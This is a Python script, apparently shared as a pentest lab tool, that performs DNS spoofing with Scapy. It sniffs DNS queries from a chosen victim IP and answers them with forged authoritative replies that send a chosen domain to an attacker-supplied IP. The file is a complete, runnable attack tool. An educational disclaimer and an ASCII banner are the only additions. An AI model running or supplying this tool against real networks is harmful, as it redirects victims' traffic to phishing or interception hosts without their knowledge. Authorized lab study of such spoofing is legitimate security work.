#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DNS Spoofing Emulator - Pentest Lab Tool
Author: Your Name / Handle
Usage:
    python3 dns_spoof.py --target <victim_ip> --domain <domain_to_spoof> --fake-ip <fake_ip>
Disclaimer:
    For educational & authorized security testing only.
"""

import argparse
import logging
from scapy.all import sniff, send, IP, UDP, DNS, DNSQR, DNSRR
from datetime import datetime
from termcolor import colored

# ---------------------- Banner ----------------------
def banner():
    print(colored(r"""
   ██████╗ ███╗   ██╗███████╗    ███████╗██████╗  ██████╗  ██████╗ ███████╗
  ██╔═══██╗████╗  ██║██╔════╝    ██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝
  ██║   ██║██╔██╗ ██║███████╗    █████╗  ██████╔╝██║   ██║██║   ██║█████╗
  ██║   ██║██║╚██╗██║╚════██║    ██╔══╝  ██╔═══╝ ██║   ██║██║   ██║██╔══╝
  ╚██████╔╝██║ ╚████║███████║    ███████╗██║     ╚██████╔╝╚██████╔╝███████╗
   ╚═════╝ ╚═╝  ╚═══╝╚══════╝    ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚══════╝
    """, "red"))
    print(colored("      ⚡ Advanced DNS Spoofing Emulator - Pentest Edition ⚡", "yellow"))
    print(colored("      Author: Raja Muhammad Bilal | For authorized lab use only\n", "cyan"))

# ---------------------- Spoof Function ----------------------
def dns_spoof(pkt, target_ip, target_domain, fake_ip):
    if pkt.haslayer(DNSQR) and pkt[IP].src == target_ip:
        qname = pkt[DNSQR].qname.decode("utf-8").strip(".")
        if qname == target_domain:
            print(colored(f"[+] Spoofing DNS reply for {qname} -> {fake_ip}", "green"))
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                          UDP(dport=pkt[UDP].sport, sport=53) / \
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                              an=DNSRR(rrname=qname, ttl=10, rdata=fake_ip))
            send(spoofed_pkt, verbose=0)

            # Logging
            logging.info(f"{datetime.now()} | Spoofed {qname} for {target_ip} -> {fake_ip}")

# ---------------------- Main ----------------------
def main():
    banner()
    parser = argparse.ArgumentParser(description="DNS Spoofing Emulator - Pentest Lab Tool")
    parser.add_argument("--target", required=True, help="Victim IP address to target")
    parser.add_argument("--domain", required=True, help="Domain to spoof")
    parser.add_argument("--fake-ip", required=True, help="Fake IP to redirect to")
    parser.add_argument("--iface", default="eth0", help="Network interface to sniff on")
    args = parser.parse_args()

    # Logging setup
    logging.basicConfig(filename="dns_spoof.log", level=logging.INFO,
                        format="%(message)s")

    print(colored(f"[*] Listening for DNS requests from {args.target} for {args.domain}...", "yellow"))
    sniff(filter=f"udp port 53 and src host {args.target}", iface=args.iface,
          store=0, prn=lambda pkt: dns_spoof(pkt, args.target, args.domain, args.fake_ip))

if __name__ == "__main__":
    main()
